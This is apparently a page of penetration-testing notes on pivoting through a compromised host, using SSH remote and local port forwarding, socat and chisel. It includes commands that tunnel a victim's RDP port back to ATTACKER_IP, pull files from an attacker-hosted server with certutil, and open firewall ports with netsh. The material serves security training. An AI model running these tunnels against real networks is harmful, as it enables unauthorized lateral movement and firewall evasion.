**`Port Forwarding`** is a mechanism for **Tunneling Application Ports** from the **Client Machine** to the **Server Machine**, or vice versa. It can be used for adding encryption to legacy applications, going through **Firewalls**. 

System Administrators use it for opening Backdoors into the Internal Network from their Home Machines. 


<br/>

### SSH Remote Port Forwarding

Useful when **`Firewall`** Policies block the Attacker's Machine from directly accessing Port **3389** on the Server. If the Attacker has previously compromised **PC-1** and, in turn, **PC-1** has access to port **3389** of the server, it can be used to Pivot to Port **3389** using **Remote Port Forwarding** from **PC-1.**

**Remote Port Forwarding** allows to take a reachable Port from the **SSH Client [PC-1]** and Project it into a **Remote SSH Server [Attacker]**.

<br/>


With this method a Port will be opened in the Attacker Machine that can be used to connect back to Port **3389** in the Server through the SSH Tunnel. **PC-1** will, in turn, **Proxy** the Connection so that the Server will see all the Traffic as if it was coming from **PC-1.**

```batch
:: -R [Request Remote Port Forward]
ssh user@ATTACKER_IP -R 3389:127.0.0.1:3389 -N
```

```batch
:: Accessing the Port from the Attacker Machine
xfreerdp /v:127.0.0.1 /u:username /p:password /port:3389
```

<br/>

### SSH Local Port Forwarding

**Local Port Forwarding** allows to Pull a Port from an SSH Server into the SSH Client. This could be used to take any Service available in an Attacker Machine and make it available through a port on **PC-1.** 

This way, any Host that can't connect directly to the **Attacker PC** but can connect to **PC-1** will now be able to reach the Attacker Services through the **Pivot Host.**


```batch
:: -L [Request Local Port Forward]
ssh tunneluser@ATTACKER_IP -L 7000:127.0.0.1:7000 -N
```

```batch
:: Hosting a Server on the Attacker Machine
python3 -m http.server 7000

:: The Server is accessible on the Victim Machine
certutil -urlcache -split -f "http://127.0.0.1:7000/test.md"
```

<br/>

:::danger Requires Administrative Privileges

Since we are Opening a new Port on **PC-1**, we might need to add a **Firewall Rule** to Allow for Incoming Connections.

- This is Common for **PORT - 80, 443 ...**

```batch
netsh advfirewall firewall add rule name="Open Port PORT" dir=in action=allow protocol=TCP localport=PORT
```

### SOCAT

One of the Disadvantages of using **`socat`** is that we need to **Transfer** it to the Pivot Host **PC-1**, making it more detectable than **SSH.**


```batch
:: Forwarding Filtered Port [3389]
socat TCP4-LISTEN:7777,fork TCP4:VICTIM_IP:3389
```

```batch
:: If the Port [3389] was Filtered now it would be Accessible
xfreerdp /v:VICTIM_IP /u:username /p:password /port:7777
```

<br/>

### CHISEL

**`Chisel`** is a fast **TCP/UDP** Tunnel, transported over **HTTP**, secured via SSH. Chisel is mainly useful for passing through **`Firewalls`**.

```batch
:: Connects back to the Attacker Listener
chisel client ATTACKER_IP:8000 R:7777:127.0.0.1:3389
```

</div>
  </TabItem>
</Tabs>


<br/>

```batch
:: Accessing the Port from the Attacker Machine
:: The Victim [RDP: 3389] is now Accessible at [PORT: 7777] on the Attacker Machine
xfreerdp /v:127.0.0.1 /u:username /p:password /port:7777
```
